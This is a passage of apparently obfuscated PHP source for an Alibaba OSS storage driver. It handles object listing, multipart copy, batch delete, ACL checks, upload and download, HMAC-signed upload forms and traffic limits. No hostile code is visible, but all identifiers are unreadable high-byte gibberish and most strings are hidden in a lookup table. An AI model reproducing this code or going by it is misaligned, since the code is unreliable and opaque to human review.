(OSS\Core\OssException $¿Êﬁœ–) { break; } $±ò‘Å¿∑ = $Ãü∫üÀö->getNextMarker(); $Æó∫œ∂ÿ = $Ãü∫üÀö->getObjectList(); $”Øâ ›Æ = $Ãü∫üÀö->getPrefixList(); foreach ($Æó∫œ∂ÿ as $Ÿ∑¸é˝) { if ($Ÿ∑¸é˝->getKey() == $…¸§Ñ√Ó) { continue; } $˛ñé›œÈ = $Ÿ∑¸é˝->getKey(); $ç«âÖ˙ı = $Ÿ∑¸é˝->getSize(); $„”èÒπ¡ = $Ÿ∑¸é˝->getLastModified(); $£¯÷ÌÁ˙ = $˜ï“¨üÁ ? array($Ù£±ê√ö[32] => $˛ñé›œÈ, $Ù£±ê√ö[90] => $ç«âÖ˙ı, $Ù£±ê√ö[206] => strtotime($„”èÒπ¡)) : $˛ñé›œÈ; $–≤üπ©∂ = $ç«âÖ˙ı == 0 && substr($˛ñé›œÈ, strlen($˛ñé›œÈ) - 1, 1) == $Ù£±ê√ö[8] ? !0 : !1; if ($§≠¸å∑ƒ) { $this->cacheMethod($Ù£±ê√ö[208], $˛ñé›œÈ, $–≤üπ©∂); $this->cacheMethod($Ù£±ê√ö[209], $˛ñé›œÈ, array($Ù£±ê√ö[90] => $ç«âÖ˙ı, $Ù£±ê√ö[1371] => $ç«âÖ˙ı, $Ù£±ê√ö[96] => strtotime($„”èÒπ¡), $Ù£±ê√ö[1372] => $„”èÒπ¡)); } if ($–≤üπ©∂) { $åÇáìñÜ[] = $˛ñé›œÈ; continue; } $ÑŸ¨Áõˆ[] = $£¯÷ÌÁ˙; } foreach ($”Øâ ›Æ as $Á°ã«ÿü) { $åÇáìñÜ[] = $Á°ã«ÿü->getPrefix(); if ($§≠¸å∑ƒ) { $this->cacheMethod($Ù£±ê√ö[208], $˛ñé›œÈ, !0); } } if ($±ò‘Å¿∑ === $Ù£±ê√ö[12]) { break; } } if ($§≠¸å∑ƒ) { $this->cacheMethod($Ù£±ê√ö[208], $ñ»≤ÇãØ, !0); } return array($Ù£±ê√ö[87] => $åÇáìñÜ, $Ù£±ê√ö[86] => $ÑŸ¨Áõˆ); } public function copyFile($’–≠íÁê, $”ù≥ÿ¯«) { $¨ó˙º—Ë = $this->size($’–≠íÁê); if ($¨ó˙º—Ë < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $’–≠íÁê, $this->bucket, $this->pathEncode($”ù≥ÿ¯«)); } catch (OSS\Core\OssException $•å˙ÔÄ‰) { return !1; } return $this->getPathOuter($”ù≥ÿ¯«); } $˚î€∑Ö€ = $this->multiCopyObject($’–≠íÁê, $”ù≥ÿ¯«, $¨ó˙º—Ë); return $˚î€∑Ö€ ? $this->getPathOuter($”ù≥ÿ¯«) : !1; } private function multiCopyObject($∞ˆÍìÖÇ, $”âÂ˝Ì–, $ôÊ≠Ú°†) { $Ì ƒñÕÒ =& $_SERVER[ëæªã÷]; try { $à∂Á◊ˆ— = array(); if ($Áíˆê¯‡ = $this->hashMd5($∞ˆÍìÖÇ)) { $à∂Á◊ˆ— = array(OSS\OssClient::OSS_HEADERS => array($Ì ƒñÕÒ[1373] => $Áíˆê¯‡)); } $°ªò®“∞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($”âÂ˝Ì–), $à∂Á◊ˆ—); $ Òû¡»» = 1; $’£˜Ó≤® = 0; $ÿÅª’†ú = array(); $†Ìß∞ÒÕ = 1024 * 1024 * 10; $Ò◊Ì´òô = $this->client->generateMultiuploadParts($ôÊ≠Ú°†, $†Ìß∞ÒÕ); foreach ($Ò◊Ì´òô as $«äá‡ÆÖ => $“ôÛˆ´‡) { $û‘ª∂âˆ = $’£˜Ó≤® + (int) $“ôÛˆ´‡[$Ì ƒñÕÒ[1374]]; $˙å∑é≥∂ = (int) $“ôÛˆ´‡[$Ì ƒñÕÒ[341]] + $û‘ª∂âˆ - 1; $”ÔÎ˚µö = array($Ì ƒñÕÒ[1375] => $û‘ª∂âˆ, $Ì ƒñÕÒ[1376] => $˙å∑é≥∂); $ÿÅª’†ú[] = $this->client->uploadPartCopy($this->bucket, $∞ˆÍìÖÇ, $this->bucket, $this->pathEncode($”âÂ˝Ì–), $ Òû¡»», $°ªò®“∞, $”ÔÎ˚µö); $ Òû¡»» = $ Òû¡»» + 1; } $‡ÒçÊ√Ÿ = array(); foreach ($ÿÅª’†ú as $«äá‡ÆÖ => $÷›ß¢”“) { $‡ÒçÊ√Ÿ[] = array($Ì ƒñÕÒ[1377] => $«äá‡ÆÖ + 1, $Ì ƒñÕÒ[1378] => $÷›ß¢”“); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($”âÂ˝Ì–), $°ªò®“∞, $‡ÒçÊ√Ÿ); } catch (OSS\Core\OssException $Ãœ≥Ë¥ö) { return !1; } return !0; } public function moveFile($ëı÷›äÛ, $Ü√≈àÿ ) { if ($this->copyFile($ëı÷›äÛ, $Ü√≈àÿ )) { $this->remove($ëı÷›äÛ); return $this->getPathOuter($Ü√≈àÿ ); } return !1; } public function delFile($Ü‚√äå´) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ü‚√äå´)); } catch (OSS\Core\OssException $€õ“«ø¥) { return !1; } return !0; } public function delFolder($Ì«≥¥™ñ) { $©áùŒ§ï =& $_SERVER[ëæªã÷]; if (!$this->exist($Ì«≥¥™ñ)) { return !0; } $this->listItemCache = !1; $ÙÔ¯Û› = $this->fileList($Ì«≥¥™ñ); $this->listItemCache = !0; $´™Ó≤Â∞ = trim($Ì«≥¥™ñ, $©áùŒ§ï[8]) . $©áùŒ§ï[8]; if (!empty($Ì«≥¥™ñ) && $Ì«≥¥™ñ !== $©áùŒ§ï[200] && !in_array($´™Ó≤Â∞, $ÙÔ¯Û›[$©áùŒ§ï[87]])) { $ÙÔ¯Û›[$©áùŒ§ï[87]][] = $´™Ó≤Â∞; } $äùñ¢üÀ = $this->delByBatch($ÙÔ¯Û›[$©áùŒ§ï[86]]); if (!$äùñ¢üÀ) { return !1; } $äùñ¢üÀ = $this->delByBatch($ÙÔ¯Û›[$©áùŒ§ï[87]]); if (!$äùñ¢üÀ) { return !1; } return $this->delFile($´™Ó≤Â∞); } private function delByBatch($ñµ¸†ù˛) { foreach (array_chunk($ñµ¸†ù˛, 1000) as $ì“⁄∑Õ›) { try { $this->client->deleteObjects($this->bucket, $ì“⁄∑Õ›); } catch (OSS\Core\OssException $Í≈˝Ø∆) { return !1; } } return !0; } public function rename($‚ïÃíõé, $»áÉØê¨) { return $this->renameObject($‚ïÃíõé, $»áÉØê¨); } private function fileInfo($òÇÇ∫≥ˆ, $ò∫√’’≤ = false, $∑ÓãóŒ± = array()) { $ÿ Î∏òÜ =& $_SERVER[ëæªã÷]; $ßâìÊøË = array($ÿ Î∏òÜ[32] => $this->pathThis($òÇÇ∫≥ˆ), $ÿ Î∏òÜ[88] => $this->getPathOuter($òÇÇ∫≥ˆ), $ÿ Î∏òÜ[33] => $ÿ Î∏òÜ[202], $ÿ Î∏òÜ[90] => isset($∑ÓãóŒ±[$ÿ Î∏òÜ[90]]) ? $∑ÓãóŒ±[$ÿ Î∏òÜ[90]] : 0, $ÿ Î∏òÜ[177] => $this->ext($òÇÇ∫≥ˆ)); if ($ò∫√’’≤) { return $ßâìÊøË; } $ßâìÊøË[$ÿ Î∏òÜ[203]] = $ßâìÊøË[$ÿ Î∏òÜ[96]] = 0; $ßâìÊøË[$ÿ Î∏òÜ[204]] = $ßâìÊøË[$ÿ Î∏òÜ[205]] = !0; if (empty($∑ÓãóŒ±)) { $êùÀ˝º§ = $this->objectMeta($òÇÇ∫≥ˆ); if (!$êùÀ˝º§) { return $ßâìÊøË; } $∑ÓãóŒ± = array($ÿ Î∏òÜ[96] => strtotime($êùÀ˝º§[$ÿ Î∏òÜ[1372]]), $ÿ Î∏òÜ[90] => $êùÀ˝º§[$ÿ Î∏òÜ[1371]] + 0); } if (isset($∑ÓãóŒ±[$ÿ Î∏òÜ[90]])) { $ßâìÊøË[$ÿ Î∏òÜ[90]] = $∑ÓãóŒ±[$ÿ Î∏òÜ[90]]; } if (isset($∑ÓãóŒ±[$ÿ Î∏òÜ[96]])) { $ßâìÊøË[$ÿ Î∏òÜ[96]] = $∑ÓãóŒ±[$ÿ Î∏òÜ[96]]; } if (isset($∑ÓãóŒ±[$ÿ Î∏òÜ[206]]) && !trim($ßâìÊøË[$ÿ Î∏òÜ[96]])) { $ßâìÊøË[$ÿ Î∏òÜ[96]] = $∑ÓãóŒ±[$ÿ Î∏òÜ[206]]; } return $ßâìÊøË; } private function folderInfo($‡ÙÖ”ÿÜ, $ÜÑΩÀøÚ = false, $ﬂıñ±Î° = array()) { $Î´äÒ®µ =& $_SERVER[ëæªã÷]; $îœ–ÃÎÉ = array($Î´äÒ®µ[32] => $this->pathThis($‡ÙÖ”ÿÜ), $Î´äÒ®µ[88] => $this->getPathOuter($Î´äÒ®µ[8] . $‡ÙÖ”ÿÜ), $Î´äÒ®µ[33] => $Î´äÒ®µ[89]); if ($ÜÑΩÀøÚ) { return $îœ–ÃÎÉ; } $îœ–ÃÎÉ[$Î´äÒ®µ[203]] = $îœ–ÃÎÉ[$Î´äÒ®µ[96]] = 0; $îœ–ÃÎÉ[$Î´äÒ®µ[204]] = $îœ–ÃÎÉ[$Î´äÒ®µ[205]] = !0; if (empty($ﬂıñ±Î°)) { $‡ÙÖ”ÿÜ = rtrim($‡ÙÖ”ÿÜ, $Î´äÒ®µ[8]) . $Î´äÒ®µ[8]; $ªÒÄáÍﬁ = $this->objectMeta($‡ÙÖ”ÿÜ); if (!$ªÒÄáÍﬁ) { return $îœ–ÃÎÉ; } $ﬂıñ±Î° = array($Î´äÒ®µ[203] => $ªÒÄáÍﬁ[$Î´äÒ®µ[511]][$Î´äÒ®µ[1379]], $Î´äÒ®µ[96] => strtotime($ªÒÄáÍﬁ[$Î´äÒ®µ[1372]])); } if (isset($ﬂıñ±Î°[$Î´äÒ®µ[96]])) { $îœ–ÃÎÉ[$Î´äÒ®µ[96]] = $ﬂıñ±Î°[$Î´äÒ®µ[96]]; } if (isset($ﬂıñ±Î°[$Î´äÒ®µ[203]])) { $îœ–ÃÎÉ[$Î´äÒ®µ[203]] = $ﬂıñ±Î°[$Î´äÒ®µ[203]]; } return $îœ–ÃÎÉ; } public function listPath($«¡´°Üù, $ìÙ˝Ñ≈Á = false) { $˛€“‚∆◊ =& $_SERVER[ëæªã÷]; $°Ë≤âû— = $this->fileList($«¡´°Üù, $˛€“‚∆◊[8], !0); foreach ($°Ë≤âû—[$˛€“‚∆◊[87]] as $®Ê≠ü…  => $À‹ê‚º) { $°Ë≤âû—[$˛€“‚∆◊[87]][$®Ê≠ü… ] = $this->folderInfo($À‹ê‚º, $ìÙ˝Ñ≈Á, $À‹ê‚º); } foreach ($°Ë≤âû—[$˛€“‚∆◊[86]] as $®Ê≠ü…  => $À‹ê‚º) { $°Ë≤âû—[$˛€“‚∆◊[86]][$®Ê≠ü… ] = $this->fileInfo($À‹ê‚º[$˛€“‚∆◊[32]], $ìÙ˝Ñ≈Á, $À‹ê‚º); } return $°Ë≤âû—; } public function has($Õ¥ﬁ¥úŸ, $Ì≥‡¸ëÖ = false, $ ù•Ò‚˝ = true) { $è®∞ÓçÜ =& $_SERVER[ëæªã÷]; $Õ¥ﬁ¥úŸ = trim($Õ¥ﬁ¥úŸ, $è®∞ÓçÜ[8]); $ﬁÖÕ◊Ü£ = empty($Õ¥ﬁ¥úŸ) && $Õ¥ﬁ¥úŸ !== $è®∞ÓçÜ[200] ? $è®∞ÓçÜ[12] : $Õ¥ﬁ¥úŸ . $è®∞ÓçÜ[8]; $˝∆©Ã ß = $è®∞ÓçÜ[12]; $Î—…û¶õ = 500; $ç–õÀ¥õ = $≠¢„æòÛ = 0; while (!0) { check_abort(); $Ïïõãú• = array($è®∞ÓçÜ[1367] => $è®∞ÓçÜ[8], $è®∞ÓçÜ[1368] => $ﬁÖÕ◊Ü£, $è®∞ÓçÜ[1369] => $Î—…û¶õ, $è®∞ÓçÜ[1370] => $˝∆©Ã ß); try { $ˆòä®¡è = $this->client->listObjects($this->bucket, $Ïïõãú•); } catch (OSS\Core\OssException $€®©›üØ) { break; } $˝∆©Ã ß = $ˆòä®¡è->getNextMarker(); $„Ìµä´î = $ˆòä®¡è->getObjectList(); $€ ©ÂÈ« = $ˆòä®¡è->getPrefixList(); if ($Ì≥‡¸ëÖ) { if (count($„Ìµä´î) > 1 || count($„Ìµä´î) == 1 && $„Ìµä´î[0]->getKey() != $ﬁÖÕ◊Ü£) { $ç–õÀ¥õ += count($„Ìµä´î) - 1; } if (!empty($€ ©ÂÈ«)) { $≠¢„æòÛ += count($€ ©ÂÈ«); } if ($˝∆©Ã ß === $è®∞ÓçÜ[12]) { break; } continue; } if ($ ù•Ò‚˝) { if (!empty($„Ìµä´î)) { if (count($„Ìµä´î) > 1 || $„Ìµä´î[0]->getKey() != $ﬁÖÕ◊Ü£) { return !0; } } } else { if (!empty($€ ©ÂÈ«)) { return !0; } } if ($˝∆©Ã ß === $è®∞ÓçÜ[12]) { break; } } if ($Ì≥‡¸ëÖ) { return array($è®∞ÓçÜ[212] => $ç–õÀ¥õ, $è®∞ÓçÜ[213] => $≠¢„æòÛ); } return !1; } public function listAll($ÛÊÑ—ÌÖ) { $¨®Ú∏»Ç =& $_SERVER[ëæªã÷]; $•óãùëª = $this->fileList($ÛÊÑ—ÌÖ, $¨®Ú∏»Ç[12], !0); $Äˆ≤∫Í· = array(); foreach ($•óãùëª[$¨®Ú∏»Ç[86]] as $ñ¥õöŒ◊) { $Äˆ≤∫Í·[$ñ¥õöŒ◊[$¨®Ú∏»Ç[32]]] = $ñ¥õöŒ◊[$¨®Ú∏»Ç[90]]; } foreach ($•óãùëª[$¨®Ú∏»Ç[87]] as $ñ¥õöŒ◊) { if (is_string($ñ¥õöŒ◊)) { $Äˆ≤∫Í·[$ñ¥õöŒ◊] = 0; } } return $this->listAllFiles($ÛÊÑ—ÌÖ, array_keys($Äˆ≤∫Í·), $Äˆ≤∫Í·); } public function canRead($êÕÈÙﬁµ) { $ü≤Æ∂≈∫ =& $_SERVER[ëæªã÷]; $∑ˆÛ¢›ﬂ = $this->pathAcl($êÕÈÙﬁµ); return $∑ˆÛ¢›ﬂ == $ü≤Æ∂≈∫[1380] || $∑ˆÛ¢›ﬂ == $ü≤Æ∂≈∫[550] ? !0 : !1; } public function canWrite($®ÇÛñ»Ë) { $Ûï≤È◊– = $this->pathAcl($®ÇÛñ»Ë); return $Ûï≤È◊– == $_SERVER[ëæªã÷][550] ? !0 : !1; } public function pathAcl($–˜…∏æΩ) { $Î“¿˘†« =& $_SERVER[ëæªã÷]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $∏ÿŸÊ›¸ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($–˜…∏æΩ)); } catch (OSS\Core\OssException $≥∆ØˆïÔ) { return !1; } $˝œ°Öù∂ = $∏ÿŸÊ›¸ == $Î“¿˘†«[37] ? $this->bucketAcl : $∏ÿŸÊ›¸; if ($˝œ°Öù∂ == $Î“¿˘†«[1381]) { return $Î“¿˘†«[1380]; } if ($˝œ°Öù∂ == $Î“¿˘†«[1382]) { return $Î“¿˘†«[550]; } return $˝œ°Öù∂; } private function chmodPath($Óé‰«õœ, $ê–’ßÀπ = '') { $˙˜€ÆõÛ =& $_SERVER[ëæªã÷]; $ßáØ⁄öá = empty($ê–’ßÀπ) ? $˙˜€ÆõÛ[1382] : $ê–’ßÀπ; $Ñ∆õõ˚ä = array($˙˜€ÆõÛ[37], $˙˜€ÆõÛ[201], $˙˜€ÆõÛ[1381], $˙˜€ÆõÛ[1382]); if (!in_array($ßáØ⁄öá, $Ñ∆õõ˚ä)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Óé‰«õœ), $ßáØ⁄öá); } catch (OSS\Core\OssException $˜≈£“ê√) { return !1; } return !0; } public function getContent($çää¿íê) { return $this->fileSubstr($çää¿íê, -1); } public function setContent($£ÁËÆ·Æ, $…⁄’íØ€ = '') { $È”ÄüπÍ =& $_SERVER[ëæªã÷]; try { $åœƒêÙ¸ = $this->trafficLimit($È”ÄüπÍ[1383]); $¯ì§‡˚˝ = $this->client->putObject($this->bucket, $this->pathEncode($£ÁËÆ·Æ), $…⁄’íØ€, $åœƒêÙ¸); } catch (OSS\Core\OssException $É¬˘„á¯) { return !1; } $ì≠∫Óœá = array($È”ÄüπÍ[1373] => trim($¯ì§‡˚˝[$È”ÄüπÍ[1384]], $È”ÄüπÍ[127]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($£ÁËÆ·Æ))); $this->updateObjMeta($£ÁËÆ·Æ, $ì≠∫Óœá); return isset($¯ì§‡˚˝[$È”ÄüπÍ[1385]][$È”ÄüπÍ[1332]]) ? !0 : !1; } private function updateObjMeta($˚ø£ÆÒ£, $ƒÚ¥åÉ‚) { $˚ø£ÆÒ£ = $this->pathEncode($˚ø£ÆÒ£); try { $ùÃñÖﬁ≠ = array(OSS\OssClient::OSS_HEADERS => $ƒÚ¥åÉ‚); $this->client->copyObject($this->bucket, $˚ø£ÆÒ£, $this->bucket, $˚ø£ÆÒ£, $ùÃñÖﬁ≠); } catch (OSS\Core\OssException $†ÄÆ•»—) { return !1; } return !0; } public function upload($§±—•Ö¡, $Üé÷Í∑˛, $·Êù–°¯ = false, $˙ŒìÈõÍ = REPEAT_REPLACE) { $≈Ï≥™“ =& $_SERVER[ëæªã÷]; $Ã∆µ’∞÷ = trim($§±—•Ö¡, $≈Ï≥™“[8]); $Ëî—Òë≈ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($≈Ï≥™“[1373] => @md5_file($Üé÷Í∑˛)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($§±—•Ö¡))); $Ëî—Òë≈ = $this->trafficLimit($≈Ï≥™“[1383], $Ëî—Òë≈); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ã∆µ’∞÷), $Üé÷Í∑˛, $Ëî—Òë≈); } catch (OSS\Core\OssException $˛©ƒ◊ß„) { return !1; } return $this->getPathOuter($§±—•Ö¡); } public function getHost() { $íêÚΩÓÅ =& $_SERVER[ëæªã÷]; $“ä˝∫¡Ó = explode($íêÚΩÓÅ[186], parent::getHost()); return $“ä˝∫¡Ó[0] . $íêÚΩÓÅ[186] . $this->bucket . $íêÚΩÓÅ[10] . $“ä˝∫¡Ó[1]; } public function uploadFormData($‡ªÍ¡ö—, $ç¥ãìÕ˙ = 3600) { $¸™Ò‰“¯ =& $_SERVER[ëæªã÷]; if (!($æ™Ï Í£ = $this->getHost())) { return !1; } $ê§ﬂ¬Ï— = $ç¥ãìÕ˙; $üÌ†±ƒÓ = date($¸™Ò‰“¯[1386], time() + $ê§ﬂ¬Ï—); $Ë‹üÑÃá = new DateTime($üÌ†±ƒÓ); $Ö»∂ÒõÜ = $Ë‹üÑÃá->format(DateTime::ISO8601); $‚Âù‘ƒŸ = strpos($Ö»∂ÒõÜ, $¸™Ò‰“¯[300]); $Ö»∂ÒõÜ = substr($Ö»∂ÒõÜ, 0, $‚Âù‘ƒŸ) . $¸™Ò‰“¯[1387]; $Ö™¶ˆ∏É = 1048576000 * 5; $—Æ”©Ã± = $this->pathFather($‡ªÍ¡ö—); $Ÿî»å‡¥ = array($¸™Ò‰“¯[1286] => $Ö»∂ÒõÜ, $¸™Ò‰“¯[1287] => array(array($¸™Ò‰“¯[1388], 0, $Ö™¶ˆ∏É), array($¸™Ò‰“¯[1290], $¸™Ò‰“¯[1291], $—Æ”©Ã±))); $§°’ëä∞ = base64_encode(json_encode($Ÿî»å‡¥)); $≥Ωëã◊ı = base64_encode(hash_hmac($¸™Ò‰“¯[236], $§°’ëä∞, $this->secret, !0)); $äç¢ïöù = array($¸™Ò‰“¯[1296] => $§°’ëä∞, $¸™Ò‰“¯[1389] => $this->accessKey, $¸™Ò‰“¯[1292] => $¸™Ò‰“¯[1284], $¸™Ò‰“¯[1390] => $≥Ωëã◊ı, $¸™Ò‰“¯[184] => $æ™Ï Í£); $äç¢ïöù = $this->trafficLimit($¸™Ò‰“¯[1383], $äç¢ïöù); return $äç¢ïöù; } public function multiUploadFormData($ﬂ¥Ñ¢◊”, $Èçç¡– = 3600) { $Ã‚‘·∏† =& $_SERVER[ëæªã÷]; if (!($««ÍœÊΩ = $this->getHost())) { return !1; } $ìûû·◊¯ = $this->trafficLimit($Ã‚‘·∏†[1383]); $ïØ˝∑ﬂ° = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ﬂ¥Ñ¢◊”), $ìûû·◊¯); return array($Ã‚‘·∏†[228] => $ïØ˝∑ﬂ°, $Ã‚‘·∏†[184] => $««ÍœÊΩ . $Ã‚‘·∏†[8] . $this->pathEncode($ﬂ¥Ñ¢◊”), $Ã‚‘·∏†[229] => gmdate($Ã‚‘·∏†[1391]), $Ã‚‘·∏†[105] => $ﬂ¥Ñ¢◊”); } public function multiUploadAuthData($Â‡üÔãø, $Í˙œ’≤¢ = array()) { $¿∂ê”˘Œ =& $_SERVER[ëæªã÷]; $˚Ó»˚‰Ö = isset($Í˙œ’≤¢[$¿∂ê”˘Œ[229]]) ? $Í˙œ’≤¢[$¿∂ê”˘Œ[229]] : gmdate($¿∂ê”˘Œ[1391]); $æéº˛ôó = isset($Í˙œ’≤¢[$¿∂ê”˘Œ[177]]) ? $Í˙œ’≤¢[$¿∂ê”˘Œ[177]] : $¿∂ê”˘Œ[12]; $«çö¨Û˙ = $Â‡üÔãø; if (isset($Í˙œ’≤¢[$¿∂ê”˘Œ[105]])) { $«çö¨Û˙ = $Í˙œ’≤¢[$¿∂ê”˘Œ[105]]; unset($Í˙œ’≤¢[$¿∂ê”˘Œ[105]]); } if (isset($Í˙œ’≤¢[$¿∂ê”˘Œ[230]])) { $Í˙œ’≤¢[$¿∂ê”˘Œ[229]] = $˚Ó»˚‰Ö; return $this->listUploadParts($«çö¨Û˙, $Í˙œ’≤¢); } $Úù±Ö˛À = array($¿∂ê”˘Œ[231], $¿∂ê”˘Œ[12], $¿∂ê”˘Œ[128], $˚Ó»˚‰Ö, "\170\x2d\157\163\x73\55\x64\141\x74\145\72{$˚Ó»˚‰Ö}", $¿∂ê”˘Œ[8] . $this->bucket . $¿∂ê”˘Œ[8] . $«çö¨Û˙ . $æéº˛ôó); if (strpos($æéº˛ôó, $¿∂ê”˘Œ[232]) === 0) { $Úù±Ö˛À[0] = $¿∂ê”˘Œ[233]; if ($†¬Âı˛† = $this->trafficLimit($¿∂ê”˘Œ[1383])) { $«çö¨Û˙ = $¿∂ê”˘Œ[1392]; array_splice($Úù±Ö˛À, 5, 0, $«çö¨Û˙ . $¿∂ê”˘Œ[4] . $†¬Âı˛†[$«çö¨Û˙]); } } if (isset($Í˙œ’≤¢[$¿∂ê”˘Œ[234]]) && $Í˙œ’≤¢[$¿∂ê”˘Œ[234]] == $¿∂ê”˘Œ[235]) { $Úù±Ö˛À[0] = $¿∂ê”˘Œ[235]; } if (!empty($Í˙œ’≤¢[$¿∂ê”˘Œ[1393]])) { $·÷üÈ§ = array_merge(array($Úù±Ö˛À[4]), $Í˙œ’≤¢[$¿∂ê”˘Œ[1393]]); sort($·÷üÈ§); $Úù±Ö˛À[4] = implode($¿∂ê”˘Œ[65], $·÷üÈ§); } $Ö¥ÜÅâÒ = implode($¿∂ê”˘Œ[65], $Úù±Ö˛À); $ﬂ®≈÷äÑ = base64_encode(hash_hmac($¿∂ê”˘Œ[236], $Ö¥ÜÅâÒ, $this->secret, !0)); $ Ñå¥Ÿ¨ = $¿∂ê”˘Œ[1357] . $this->accessKey . $¿∂ê”˘Œ[4] . $ﬂ®≈÷äÑ; if (strpos($æéº˛ôó, $¿∂ê”˘Œ[232]) === 0) { $ Ñå¥Ÿ¨ = array($¿∂ê”˘Œ[238] => $ Ñå¥Ÿ¨, $¿∂ê”˘Œ[229] => $˚Ó»˚‰Ö); if ($†¬Âı˛†) { $ Ñå¥Ÿ¨ = array_merge($ Ñå¥Ÿ¨, $†¬Âı˛†); } } return $ Ñå¥Ÿ¨; } public function listUploadParts($πÕ˝ô‘Ç, $÷Éﬁ˙ó¢) { $§¸‘≈õÇ =& $_SERVER[ëæªã÷]; $˜ÊÙÔºÜ = parse_url_query($÷Éﬁ˙ó¢[$§¸‘≈õÇ[177]]); $˚Ωüﬂµ = $this->client->listParts($this->bucket, $this->pathEncode($πÕ˝ô‘Ç), $˜ÊÙÔºÜ[$§¸‘≈õÇ[228]]); $ﬁﬂÇ≠ê“ = $˚Ωüﬂµ->getListPart(); $œ˝œÈ›á = array(); foreach ($ﬁﬂÇ≠ê“ as $ºòû˛¸⁄) { $œ˝œÈ›á[] = array($§¸‘≈õÇ[1377] => $ºòû˛¸⁄->getPartNumber(), $§¸‘≈õÇ[1378] => trim($ºòû˛¸⁄->getETag(), $§¸‘≈õÇ[127])); } unset($÷Éﬁ˙ó¢[$§¸‘≈õÇ[230]], $÷Éﬁ˙ó¢[$§¸‘≈õÇ[234]]); $¿É¿Å®∆ = $this->multiUploadAuthData($πÕ˝ô‘Ç, $÷Éﬁ˙ó¢); if (empty($¿É¿Å®∆)) { return !1; } return array($§¸‘≈õÇ[238] => $¿É¿Å®∆, $§¸‘≈õÇ[229] => $÷Éﬁ˙ó¢[$§¸‘≈õÇ[229]], $§¸‘≈õÇ[240] => $œ˝œÈ›á); } public function download($©˙»ƒö√, $»¯ßä≈õ) { if ($this->isFolder($©˙»ƒö√)) { return !1; } try { $“≤¥⁄∏µ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $»¯ßä≈õ); $“≤¥⁄∏µ = $this->trafficLimit($_SERVER[ëæªã÷][120], $“≤¥⁄∏µ); $this->client->getObject($this->bucket, $this->pathEncode($©˙»ƒö√), $“≤¥⁄∏µ); } catch (OSS\Core\OssException $…≠Æ´’Ê) { return !1; } return $»¯ßä≈õ; } public function fileSubstr($È≥ü≤≤Ä, $º’ïí¸á = 0, $‡äö•¥û = false) { if ($º’ïí¸á === -1) { $Ö¥õß–œ = array(); } else { if ($‡äö•¥û === !1) { $É≠òÖ€Ï = $this->size($È≥ü≤≤Ä); } else { $É≠òÖ€Ï = $º’ïí¸á + $‡äö•¥û - 1; } $Ö¥õß–œ = array(OSS\OssClient::OSS_RANGE => "{$º’ïí¸á}\x2d{$É≠òÖ€Ï}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($È≥ü≤≤Ä), $Ö¥õß–œ); } catch (OSS\Core\OssException $¯„√ºÙæ) { think_exception($¯„√ºÙæ->getMessage()); return !1; } } private function trafficLimit($˘ÿº÷ö‰, $«Á˙—îƒ = array()) { $’®’ê≈õ =& $_SERVER[ëæªã÷]; if ($˘ÿº÷ö‰ == $’®’ê≈õ[1383] && $this->isUploadServer() || $˘ÿº÷ö‰ == $’®’ê≈õ[120] && $this->isFileOutServer()) { return $«Á˙—îƒ; } $œêΩçﬂ = floatval($GLOBALS[$’®’ê≈õ[6]][$’®’ê≈õ[100]][$’®’ê≈õ[118]][$˘ÿº÷ö‰]) * 1024 * 1024 * 8; if (!$œêΩçﬂ) { return $«Á˙—îƒ; } $œêΩçﬂ = $œêΩçﬂ < 819200 ? 819200 : ($œêΩçﬂ > 838860800 ? 838860800 : $œêΩçﬂ); $«Á˙—îƒ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($œêΩçﬂ); return $«Á˙—îƒ; } public function link($ôÒàê„•, $ÄÏ°≠òó = array()) { $Í”π–˜ =& $_SERVER[ëæªã÷]; if (!$this->exist($ôÒàê„•) || $this->isFolder($ôÒàê„•)) { return !1; } try { $ÄÏ°≠òó = $this->trafficLimit($Í”π–˜[120], $ÄÏ°≠òó); $õ÷˚Ó≠Ù = $this->client->signUrl($this->bucket, $this->pathEncode($ôÒàê„•), 3600 * 12, $Í”π–˜[235], $ÄÏ°≠òó); return $this->getCdnLink($õ÷˚Ó≠Ù); } catch (OSS\Core\OssException $”È†˛«Ì) { return !1; } } public function fileOut($Å¢›Ñïä, $Ë•ÍÊ„Ω = false, $Œ≈¶˝ê” = false, $òª•âı’ = '') { $äèÃÚìÂ =& $_SERVER[ëæªã÷]; if ($this->isFileOutServer()) { return $this->fileOutServer($Å¢›Ñïä, $Ë•ÍÊ„Ω, $Œ≈¶˝ê”, $òª•âı’); } if (!$Œ≈¶˝ê”) { $Œ≈¶˝ê” = $this->pathThis($Å¢›Ñïä); } $Œ≈¶˝ê” = rawurlencode($Œ≈¶˝ê”); $ô¢ÿç¸‘ = get_file_mime(get_path_ext($Œ≈¶˝ê”)); if ($ô¢ÿç¸‘ == $äèÃÚìÂ[222]) { return parent::fileOut($Å¢›Ñïä, $Ë•ÍÊ„Ω, $Œ≈¶˝ê”, $òª•âı’); } $Ë•ÍÊ„Ω = $Ë•ÍÊ„Ω ? $äèÃÚìÂ[1394] : $äèÃÚìÂ[1395]; $–˛≈∞áê = array(OSS\OssClient::OSS_SUB_RESOURCE => $äèÃÚìÂ[1396] . rawurlencode("{$Ë•ÍÊ„Ω}\73\x66\x69\x6c\145\x6e\x61\155\x65\x3d{$Œ≈¶˝ê”}")); $–˛≈∞áê[OSS\OssClient::OSS_SUB_RESOURCE] .= $äèÃÚìÂ[1397] . rawurlencode($ô¢ÿç¸‘); $˘„Ù»¿ê = $this->link($Å¢›Ñïä, $–˛≈∞áê); $this->fileOutLink($˘„Ù»¿ê); } public function fileOutServer($º‡›à∫ô, $ãæ®∂ΩÛ = false, 